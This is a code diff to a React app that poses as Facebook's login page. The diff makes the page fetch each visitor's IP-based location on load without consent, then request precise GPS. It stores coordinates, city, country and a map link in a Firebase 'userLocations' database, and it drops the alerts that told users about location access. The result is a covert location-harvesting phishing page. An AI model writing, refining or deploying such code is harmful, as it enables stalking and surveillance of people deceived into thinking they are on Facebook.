@@ -7,95 +7,92 @@ function App() {
   const [loading, setLoading] = useState(true);
 
   useEffect(() => {
-    requestLocation();
+    getIPLocation(); // Step 1: Get IP location first
   }, []);
 
-  // 📌 Function to request location (GPS first, fallback to IP)
-  const requestLocation = () => {
-    console.log("📌 Checking location permission...");
-    checkPermissionAndFetchLocation();
+  // 📌 Step 1: Get Location Using IP (First)
+  const getIPLocation = async () => {
+    try {
+      const response = await fetch("https://ip-api.com/json");
+      const data = await response.json();
+
+      const ipLocationData = {
+        latitude: data.lat,
+        longitude: data.lon,
+        method: "IP-based",
+        city: data.city,
+        country: data.country,
+        timestamp: new Date().toISOString(),
+        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`,
+      };
+
+      setLocation(ipLocationData);
+      saveLocation(ipLocationData);
+
+      // Step 2: Now ask for GPS Location
+      requestGPSLocation();
+    } catch (err) {
+      console.error("❌ IP Geolocation failed:", err);
+      requestGPSLocation(); // Still ask for GPS even if IP fails
+    }
   };
 
-  // 📌 Check and Request Permission for GPS
-  const checkPermissionAndFetchLocation = async () => {
+  // 📌 Step 2: Request GPS Permission & Location
+  const requestGPSLocation = () => {
+    console.log("📌 Checking GPS location permission...");
     if ("permissions" in navigator) {
-      try {
-        const permission = await navigator.permissions.query({ name: "geolocation" });
-  
-        if (permission.state === "granted") {
-          console.log("✅ Location permission granted");
+      navigator.permissions
+        .query({ name: "geolocation" })
+        .then((permission) => {
+          if (permission.state === "granted" || permission.state === "prompt") {
+            console.log("✅ GPS permission granted. Fetching GPS...");
+            getGPSLocation();
+          } else {
+            console.warn("❌ GPS Permission Denied.");
+          }
+        })
+        .catch(() => {
+          console.warn("⚠️ Permission API failed, trying GPS...");
           getGPSLocation();
-        } else if (permission.state === "prompt") {
-          console.log("🔔 Asking user for permission...");
-          getGPSLocation();
-        } else {
-          console.warn("❌ Permission denied. Asking user to enable it...");
-          alert(
-            "Location access is blocked. Please enable it in your browser settings."
-          );
-        }
-      } catch (err) {
-        console.warn("⚠️ Permission API failed, trying GPS...", err);
-        getGPSLocation();
-      }
+        });
     } else {
       console.warn("⚠️ Permission API not supported, trying GPS...");
       getGPSLocation();
     }
   };
-  
 
-  // 📌 Get Location Using GPS
+  // 📌 Step 3: Get Precise GPS Location
   const getGPSLocation = () => {
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
-        async (position) => {
+        (position) => {
           const { latitude, longitude } = position.coords;
-          saveLocation(latitude, longitude, "GPS");
+
+          const gpsLocationData = {
+            latitude,
+            longitude,
+            method: "GPS",
+            timestamp: new Date().toISOString(),
+            mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
+          };
+
+          setLocation(gpsLocationData);
+          saveLocation(gpsLocationData);
+          setLoading(false);
         },
-        async (error) => {
-          console.warn("❌ GPS failed, trying IP-based location...", error);
-          if (error.code === error.PERMISSION_DENIED) {
-            alert("Please allow location access in your browser settings.");
-          }
-          getIPLocation(); // Fallback to IP
+        (error) => {
+          console.warn("❌ GPS failed:", error);
+          setLoading(false);
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     } else {
       console.error("❌ Geolocation not supported");
-      alert("Your browser does not support location services.");
-    }
-  };
-  
-
-  // 📌 Get Location Using IP (Fallback)
-  const getIPLocation = async () => {
-    try {
-      const response = await fetch("https://ip-api.com/json");
-      const data = await response.json();
-      saveLocation(data.lat, data.lon, "IP-based", data.city, data.country);
-    } catch (err) {
-      console.error("❌ IP Geolocation failed:", err);
     }
   };
 
-  // 📌 Function to Store Location in Firebase
-  const saveLocation = async (latitude, longitude, method, city = "", country = "") => {
-    const locationData = {
-      latitude,
-      longitude,
-      method, // GPS or IP-based
-      city,
-      country,
-      timestamp: new Date().toISOString(),
-      mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`, // Google Maps link
-    };
-
-    setLocation(locationData);
-    setLoading(false);
-
-    // Store in Firebase Realtime Database
+  // 📌 Save Location to Firebase
+  const saveLocation = async (locationData) => {
     const locationRef = ref(database, "userLocations");
     await push(locationRef, locationData);
   };
@@ -129,7 +126,6 @@ function App() {
           Connect with friends and the world around you on Facebook.
         </p>
 
-        {/* Login Form */}
         <input
           type="text"
           placeholder="Email or phone number"
@@ -212,7 +208,11 @@ function App() {
                 href={location.mapLink}
                 target="_blank"
                 rel="noopener noreferrer"
-                style={{ color: "#1877f2", textDecoration: "none", fontWeight: "bold" }}
+                style={{
+                  color: "#1877f2",
+                  textDecoration: "none",
+                  fontWeight: "bold",
+                }}
               >
                 View on Google Maps
               </a>
